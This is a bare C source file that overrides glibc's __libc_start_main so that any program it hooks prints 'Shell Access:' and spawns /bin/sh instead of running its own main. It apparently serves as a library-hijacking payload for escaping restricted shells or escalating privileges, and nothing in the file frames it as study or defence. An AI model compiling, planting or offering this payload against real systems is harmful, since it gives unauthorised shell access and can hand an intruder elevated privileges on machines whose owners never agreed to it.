#include <stdio.h>
int __libc_start_main(int (*main) (int, char **, char **), int argc, char *argv, void (*init) (void), void (*fini) (void), void (*rtld_fini) (void), void *stack_end) {
        printf("Shell Access:\n");
        system("/bin/sh");
}
